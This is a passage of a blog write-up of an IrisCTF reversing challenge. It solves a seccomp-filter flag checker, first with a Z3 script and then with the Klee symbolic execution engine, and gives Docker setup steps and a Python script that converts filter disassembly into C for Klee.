class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">6</span>):</span><br><span class=\"line\">    x = BitVec(<span class=\"string\">f&quot;args2[<span class=\"subst\">&#123;i&#125;</span>]&quot;</span>, <span class=\"number\">32</span>)</span><br><span class=\"line\">    args2.append(x)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"number\">32</span>, <span class=\"number\">8</span>):</span><br><span class=\"line\">        s.add(Extract(j + <span class=\"number\">7</span>, j, x) &lt;= <span class=\"number\">127</span>)</span><br><span class=\"line\">        s.add(Extract(j + <span class=\"number\">7</span>, j, x) &gt;= <span class=\"number\">32</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;disasm.txt&quot;</span>) <span class=\"keyword\">as</span> disassembly:</span><br><span class=\"line\">    <span class=\"keyword\">for</span> line_number, line <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(disassembly):</span><br><span class=\"line\">        line = line.strip()</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># ignore all return and kill statements, not needed for our solver</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&quot;return&quot;</span> <span class=\"keyword\">in</span> line:</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"string\">&quot; &gt;&gt; &quot;</span> <span class=\"keyword\">in</span> line: <span class=\"comment\"># upper DWORD being extracted</span></span><br><span class=\"line\">            line = line.replace(<span class=\"string\">&quot; &gt;&gt; 32&quot;</span>, <span class=\"string\">&quot;&quot;</span>).replace(<span class=\"string\">&quot;args&quot;</span>, <span class=\"string\">&quot;args2 &quot;</span>)</span><br><span class=\"line\">            </span><br><span class=\"line\">        <span class=\"comment\"># lines where constraint for our input comes in </span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&quot;goto&quot;</span> <span class=\"keyword\">in</span> line:</span><br><span class=\"line\">            temp_line = line.split()</span><br><span class=\"line\">            lhs = temp_line[<span class=\"number\">1</span>][<span class=\"number\">1</span>:]</span><br><span class=\"line\">            rhs = temp_line[<span class=\"number\">3</span>][:-<span class=\"number\">1</span>]</span><br><span class=\"line\">            rhs = <span class=\"built_in\">eval</span>(rhs)</span><br><span class=\"line\">            s.add(A == rhs)</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"built_in\">exec</span>(line)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># if A is an integer and not a BitVector, make sure it is </span></span><br><span class=\"line\">        <span class=\"comment\"># within the 32-bit limit </span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span>(A) == <span class=\"built_in\">int</span>:</span><br><span class=\"line\">            A = A % (<span class=\"number\">2</span> ** INT_BITS)</span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">assert</span> s.check() == sat</span><br><span class=\"line\">model = s.model()</span><br><span class=\"line\"></span><br><span class=\"line\">getFlag(model)</span><br></pre></td></tr></table></figure></p>\n<p>That's one way to solve it, but one way doesn't cut it, does it?</p>\n<p>After the CTF, I came across <span class=\"exturl\" data-url=\"aHR0cHM6Ly9rbGVlLmdpdGh1Yi5pbw==\">Klee</span>. Klee, you could say, is a Symbolic Virtual Machine (Solver), that allows you to symbolically execute a C source file. This is advantageous for 2 main reasons:</p>\n<ul>\n<li>You don't have to bother about having to convert C source to Python (to have to apply Z3 on it to solve symbolically)</li>\n<li>While converting from C to Python, we don't have to worry about stuff like signedness and typecasting üòÉ</li>\n</ul>\n<p>Klee is a symbolic execution engine that explores program paths symbolically, treating variables as symbols rather than with concrete values. It is built on top of the LLVM compiler infrastructure, so this integration allows it to work easily with programs written in C/C++, and leverage LLVM capabilities for program analysis and transformation.</p>\n<h4 id=\"install-klee\"><a class=\"anchor\" href=\"#install-klee\">#</a> <strong>Install Klee</strong></h4>\n<p>Install <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vZW5naW5lL2luc3RhbGwv\">Docker</span> (since that is what I used to run Klee on this)</p>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker pull klee/klee</span><br><span class=\"line\">docker run --<span class=\"built_in\">rm</span> -ti --<span class=\"built_in\">ulimit</span>=<span class=\"string\">&#x27;stack=-1:-1&#x27;</span> klee/klee</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"convert-c-source-to-bitcode\"><a class=\"anchor\" href=\"#convert-c-source-to-bitcode\">#</a> <strong>Convert C source to Bitcode</strong></h4>\n<p>(Bitcode is the format of code that Klee operates on. It is the LLVM IR representation of the code used by compiler chains like  <code>clang</code> )<br />\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">clang -emit-llvm -c &lt;filename&gt;.c</span><br><span class=\"line\">klee &lt;filename&gt;.bc</span><br></pre></td></tr></table></figure></p>\n<p>This will generate a directory with a number (indicating the number of times you've run Klee on the file so far),  <code>klee-last</code>  is the directory with the information on the file that was last symbolically executed with Klee.</p>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">ls</span> klee-assert/ | grep assert </span><br><span class=\"line\">ktest-tool klee-latest/&lt;files_output_from_previous_command&gt;</span><br></pre></td></tr></table></figure></p>\n<p>The files are output in a format  <code>test&lt;number&gt;.assert.err</code> .</p>\n<p>To run Klee on your C-source, simply run<br />\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ktest-tool klee-last/test&lt;number&gt;.ktest</span><br></pre></td></tr></table></figure></p>\n<p><strong>To generate the filter.c files to run using Klee, you can do the following</strong>:<br />\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">seccomp-tools dump ./chal -l 8 &gt; full_disasm.txt</span><br></pre></td></tr></table></figure><br />\n&lt;br&gt;</p>\n<p>Followed by a script to split these files and parse them, then convert them to C files in the format the Klee expects<br />\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># split the large output into 8 separate files properly </span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">split_files</span>(<span class=\"params\">filename</span>):</span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(filename, <span class=\"string\">&quot;r&quot;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">        disassembly = f.readlines()</span><br><span class=\"line\"></span><br><span class=\"line\">    LINES_PER_FILE=<span class=\"number\">3797</span></span><br><span class=\"line\">    i = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> disassembly:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (i % LINES_PER_FILE == <span class=\"number\">0</span>):</span><br><span class=\"line\">            <span class=\"comment\"># open the next file to disassemble </span></span><br><span class=\"line\">            file_number = i // LINES_PER_FILE</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (i != <span class=\"number\">0</span>):</span><br><span class=\"line\">                f.close()</span><br><span class=\"line\">                f = <span class=\"built_in\">open</span>(<span class=\"string\">f&quot;disassembly_<span class=\"subst\">&#123;file_number&#125;</span>.txt&quot;</span>, <span class=\"string\">&quot;w&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                f = <span class=\"built_in\">open</span>(<span class=\"string\">f&quot;disassembly_<span class=\"subst\">&#123;file_number&#125;</span>.txt&quot;</span>, <span class=\"string\">&quot;w&quot;</span>)</span><br><span class=\"line\">        f.write(<span class=\"string\">&#x27; &#x27;</span>.join(line.split()[<span class=\"number\">5</span>:]) + <span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">        i += <span class=\"number\">1</span>  </span><br><span class=\"line\"></span><br><span class=\"line\">program_head = <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">#include &lt;stdint.h&gt;</span></span><br><span class=\"line\"><span class=\"string\">#include &lt;stdbool.h&gt;</span></span><br><span class=\"line\"><span class=\"string\">#include &lt;stdlib.h&gt;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#include &lt;assert.h&gt;</span></span><br><span class=\"line\"><span class=\"string\">#include &quot;klee/klee.h&quot;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#define ERRNO(x) (x)</span></span><br><span class=\"line\"><span class=\"string\">#define KILL 2</span></span><br><span class=\"line\"><span class=\"string\">#define ALLOW 1</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#define EM_X86_64 62</span></span><br><span class=\"line\"><span class=\"string\">#define __AUDIT_ARCH_64BIT 0x80000000</span></span><br><span class=\"line\"><span class=\"string\">#define __AUDIT_ARCH_LE 0x40000000</span></span><br><span class=\"line\"><span class=\"string\">#define AUDIT_ARCH_X86_64 (EM_X86_64 | __AUDIT_ARCH_64BIT | __AUDIT_ARCH_LE)</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">prog_main = <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">int main(int argc, char * argv[]) &#123;</span></span><br><span class=\"line\"><span class=\"string\">    uint64_t args[6];</span></span><br><span class=\"line\"><span class=\"string\">    klee_make_symbolic(args, sizeof(args), &quot;args&quot;);</span></span><br><span class=\"line\"><span class=\"string\">    uint8_t result = filter(args);</span></span><br><span class=\"line\"><span class=\"string\">    // Did the filter return zero?</span></span><br><span class=\"line\"><span class=\"string\">    klee_assume(result == 0);</span></span><br><span class=\"line\"><span class=\"string\">    // If we reach this point, we found a solution</span></span><br><span class=\"line\"><span class=\"string\">    klee_assert(0);</span></span><br><span class=\"line\"><span class=\"string\">    return 0;</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">function_init = <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">uint8_t filter(uint64_t args[6]) &#123;</span></span><br><span class=\"line\"><span class=\"string\">    // initialize memory and registers</span></span><br><span class=\"line\"><span class=\"string\">    uint32_t A = 0;</span></span><br><span class=\"line\"><span class=\"string\">    uint32_t X = 0;</span></span><br><span class=\"line\"><span class=\"string\">    // fix architecture and syscall number</span></span><br><span class=\"line\"><span class=\"string\">    uint32_t sys_number = 0x1337;</span></span><br><span class=\"line\"><span class=\"string\">    uint32_t arch = AUDIT_ARCH_X86_64;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    uint32_t mem[16] = &#123;0&#125;;</span></span><br><span class=\"line\"><span class=\"string\">    [FUNCTION BODY]</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># return the line number that control flow will go to, given a line</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">goto_target</span>(<span class=\"params\">line: <span class=\"built_in\">str</span></span>):</span><br><span class=\"line\">    line = line.split()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> line[<span class=\"number\">5</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># generate function body </span></span><br><span class=\"line\"><span class=\"comment\"># need to keep track of line number, starting from 1, to insert goto_label into line</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">parse_disassembly</span>(<span class=\"params\">disassembly</span>):    </span><br><span class=\"line\">    c_code = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> line_number, line <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(disassembly):</span><br><span class=\"line\">        line_number += <span class=\"number\">1</span>  <span class=\"comment\"># line number is normally zero-indexed</span></span><br><span class=\"line\">        <span class=\"comment\"># if line has a goto statement, most important </span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&quot;goto&quot;</span> <span class=\"keyword\">in</span> line:</span><br><span class=\"line\">            <span class=\"comment\"># store line number and insert &quot;LABEL_&quot; + line_number + &quot;_&quot; in next line </span></span><br><span class=\"line\">            goto_line = goto_target(line)</span><br><span class=\"line\">            <span class=\"comment\"># insert label</span></span><br><span class=\"line\">            c_code += line.replace(<span class=\"built_in\">str</span>(goto_line), <span class=\"string\">f&quot;LABEL_<span class=\"subst\">&#123;goto_line&#125;</span>&quot;</span>)</span><br><span class=\"line\">            c_code += <span class=\"string\">&quot;LABEL_&quot;</span> + goto_line + <span class=\"string\">&quot;: &quot;</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            c_code += line </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> c_code </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">main</span>():</span><br><span class=\"line\">    split_files(<span class=\"string\">&quot;full_disasm.txt&quot;</span>)</span><br><span class=\"line\">    <span class=\"comment\"># iterate through all the disassembly files to parse out </span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> file_number <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"number\">8</span>):</span><br><span class=\"line\">        <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">f&quot;disassembly_<span class=\"subst\">&#123;file_number&#125;</span>.txt&quot;</span>, <span class=\"string\">&quot;r&quot;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">            disassembly = f.readlines()</span><br><span class=\"line\"></span><br><span class=\"line\">        c_code = parse_disassembly(disassembly)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">f&quot;filter_<span class=\"subst\">&#123;file_number&#125;</span>.c&quot;</span>, <span class=\"string\">&quot;w&quot;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">            program = program_head + <span class=\"string\">&quot;\\n\\n&quot;</span> + function_init.replace(<span class=\"string\">&quot;[FUNCTION BODY]&quot;</span>, c_code) + prog_main </span><br><span class=\"line\">            f.write(program)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure></p>\n<p>All in all, this was a very fun challenge for me to solve - with lots to learn. GGs to the author from IrisSec for making such a unique challenge!</p>\n",
            "tags": [
                "Writeup",
                "Security",
                "Reversing",
                "CTF",
                "IrisCTF"
            ]
        }
    ]
}